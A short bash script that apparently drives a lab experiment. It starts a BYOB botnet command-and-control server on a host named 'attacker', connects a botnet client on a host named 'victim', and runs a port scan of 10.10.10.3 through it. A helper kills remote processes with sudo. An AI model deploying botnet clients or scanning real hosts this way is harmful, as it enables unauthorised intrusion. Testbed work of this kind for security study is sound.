#!/bin/bash


remote_kill() {
    node=$1
    prog=$2
    ssh $node "sudo kill \$(ps -e | grep $prog | awk '{print \$1}')"
}



ssh attacker "cd ~/byob && ./server.py" &
attackerPid=$1

sleep 5 # let the server boot

ssh victim "byob-client" &
victimPid=$!

sleep 2 # let the victim connect

ssh attacker "byossh portscanner 10.10.10.3 >> /tmp/port-results && cat /tmp/port-results"

sleep 15

